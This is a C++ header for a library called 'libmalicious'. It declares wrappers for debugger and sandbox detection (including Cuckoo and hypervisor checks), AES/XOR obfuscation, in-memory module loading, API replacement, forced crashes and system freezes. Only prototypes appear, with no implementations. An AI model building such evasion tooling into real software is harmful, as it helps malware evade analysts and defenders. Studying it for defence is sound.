#pragma once



#include "xConversion.h"
#include "xCrash.h"
#include "xDebuggerDetection.h"
#include "xDelay.h"
#include "xFreeze.h"
#include "xMemory.h"
#include "xMemoryModule.h"
#include "xObfuscation.h"
#include "xOsReplacementApi.h"
#include "xRandom.h"
#include "xSandboxDetection.h"
#include "xStaticModule.h"
#include "xString.h"



class xLibMaliciousApi
{
private:
	xLibMaliciousApi()
	{
	}

public:
	static xLibMaliciousApi& GetLibMaliciousApi()
	{
		static xLibMaliciousApi s_libMaliciousApi;

		return s_libMaliciousApi;
	}

public:
	// libmalicious
	X_STATIC_MODULE_BEGIN(LibMalicious)
		// xConversion
		X_STATIC_MODULE_FUNCTION_3(bool, xConversionHexStringToByte, const char*, uint8_t**, uint32_t*)
		X_STATIC_MODULE_FUNCTION_4(bool, xConversionBase64Encode, const uint8_t*, const size_t, char**, size_t*)
		X_STATIC_MODULE_FUNCTION_4(bool, xConversionBase64Decode, const char*, const size_t, uint8_t**, size_t*)

		// xCrash
		X_STATIC_MODULE_FUNCTION_0(void, xCrashAccessViolation)
		X_STATIC_MODULE_FUNCTION_0(void, xCrashDivideByZero)
		X_STATIC_MODULE_FUNCTION_0(void, xCrashFunctionPointer)
		X_STATIC_MODULE_FUNCTION_0(void, xCrashIfDebugger)
		X_STATIC_MODULE_FUNCTION_0(void, xCrashPureVirtual)
		X_STATIC_MODULE_FUNCTION_0(void, xCrashRandom)
		X_STATIC_MODULE_FUNCTION_0(void, xCrashStackOverflow)

		// xDebuggerDetection
		X_STATIC_MODULE_FUNCTION_0(bool, xDebuggerDetectionInt2d)
		X_STATIC_MODULE_FUNCTION_0(bool, xDebuggerDetectionIsPresent)

		// xDelay
		X_STATIC_MODULE_FUNCTION_0(void, xDelayInternalNetwork)
		X_STATIC_MODULE_FUNCTION_0(void, xDelayIcmp)
		X_STATIC_MODULE_FUNCTION_0(void, xDelayWindowsUpdate)

		// xFreeze
		X_STATIC_MODULE_FUNCTION_0(void, xFreezeSystem)

		// xMemory
		X_STATIC_MODULE_FUNCTION_1(void*, xMemoryAlloc, size_t)
		X_STATIC_MODULE_FUNCTION_3(void, xMemoryCopy, void*, const void*, size_t)
		X_STATIC_MODULE_FUNCTION_1(void, xMemoryFree, void*)
		X_STATIC_MODULE_FUNCTION_2(void, xMemoryZero, void*, const size_t)

		// xMemoryModule
		X_STATIC_MODULE_FUNCTION_5(LPVOID, xMemoryModuleDefaultAlloc, LPVOID, SIZE_T, DWORD, DWORD, void*)
		X_STATIC_MODULE_FUNCTION_4(BOOL, xMemoryModuleDefaultFree, LPVOID, SIZE_T, DWORD, void*)
		X_STATIC_MODULE_FUNCTION_3(FARPROC, xMemoryModuleDefaultGetProcAddress, HCUSTOMMODULE, LPCSTR, void*)

		// xObfuscation
		X_STATIC_MODULE_FUNCTION_6(bool, xObfuscationObfuscateAes, const uint8_t*, const uint32_t, const uint8_t*, const uint32_t, uint8_t**, uint32_t*)
		X_STATIC_MODULE_FUNCTION_6(bool, xObfuscationDeobfuscateAes, const uint8_t*, const uint32_t, const uint8_t*, const uint32_t, uint8_t**, uint32_t*)
		X_STATIC_MODULE_FUNCTION_4(bool, xObfuscationObfuscateXor, const uint8_t, const uint8_t*, const uint32_t, uint8_t**)
		X_STATIC_MODULE_FUNCTION_4(bool, xObfuscationDeobfuscateXor, const uint8_t, const uint8_t*, const uint32_t, uint8_t**)

		// xOsApiReplacement
		X_STATIC_MODULE_FUNCTION_2(void*, xOsReplacementApiGetProcAddress, HANDLE, const char*)

		// xRandom
		X_STATIC_MODULE_FUNCTION_2(uint32_t, xRandomNumber, uint32_t, uint32_t)

		// xSandboxDetection
		X_STATIC_MODULE_FUNCTION_0(bool, xSandboxDetectionIsHypervisor)
		X_STATIC_MODULE_FUNCTION_0(bool, xSandboxDetectionIsCuckoo)
		X_STATIC_MODULE_FUNCTION_0(bool, xSandboxDetectionIsDomainMember)

		// xString
		X_STATIC_MODULE_FUNCTION_2(wchar_t*, xStringAppend, const wchar_t*, const wchar_t*)
	X_STATIC_MODULE_END(LibMalicious)
};

static xLibMaliciousApi& xGetLibMaliciousApi() { return xLibMaliciousApi::GetLibMaliciousApi(); }



#ifdef X_USE_OBFUSCATED_API
	#define X_LIB_MALICIOUS_CALL(__Name)	xGetLibMaliciousApi().GetLibMalicious().##__Name
#else
	#define X_LIB_MALICIOUS_CALL(__Name)	__Name
#endif